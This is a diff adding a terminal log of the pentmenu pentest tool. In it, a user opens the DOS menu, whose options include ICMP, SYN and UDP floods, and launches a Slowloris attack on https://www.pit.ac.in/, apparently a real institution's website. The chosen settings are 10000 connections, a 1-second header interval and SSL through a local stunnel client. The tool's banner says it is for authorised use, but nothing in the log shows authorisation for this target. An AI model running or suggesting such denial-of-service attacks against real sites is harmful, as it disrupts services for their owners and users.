@@ -1,0 +1,46 @@
+
+
+ ________ _______  _       _________ _______  ________  _                
+|  ____  ||  ____ \| \    /|\__   __/|       ||  ____ \| \    /||\     /|
+| |    | || |    \/|  \  | |   | |   | || || || |    \/|  \  | || |   | |
+| |____| || |__    |   \ | |   | |   | || || || |__    |   \ | || |   | |
+|  ______||  __)   | |\ \| |   | |   | ||_|| ||  __)   | |\ \| || |   | |
+| |       | |      | | \   |   | |   | |   | || |      | | \   || |   | |
+| |       | |____/\| |  \  |   | |   | |   | || |____/\| |  \  || |___| |
+|/        (_______/|/    \_|   |_|   |/     \||_______/|/    \_||_______|
+
+Welcome to pentmenu!
+Please report all bugs, improvements and suggestions to https://github.com/GinjaChris/pentmenu/issues
+This software is only for responsible, authorised use.
+YOU are responsible for your own actions!
+Please review the readme at https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md before proceeding
+
+1) Recon
+2) DOS
+3) Extraction
+4) View Readme
+5) Quit
+Pentmenu>2
+1) ICMP Echo Flood	 6) TCP XMAS Flood	11) Distraction Scan
+2) ICMP Blacknurse	 7) UDP Flood		12) DNS NXDOMAIN Flood
+3) TCP SYN Flood	 8) SSL DOS		13) Go back
+4) TCP ACK Flood	 9) Slowloris
+5) TCP RST Flood	10) IPsec DOS
+Pentmenu>9
+Using netcat for Slowloris attack....
+Enter target:
+https://www.pit.ac.in/
+Target is set to https://www.pit.ac.in/
+Enter target port (defaults to 80):
+80
+Using Port 80
+Enter number of connections to open (default 2000):
+10000
+Choose interval between sending headers.
+Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:
+1
+use SSL/TLS? [y]es or [n]o (default):
+y
+Using SSL/TLS
+Creating stunnel client on 127.0.0.1:9991
+
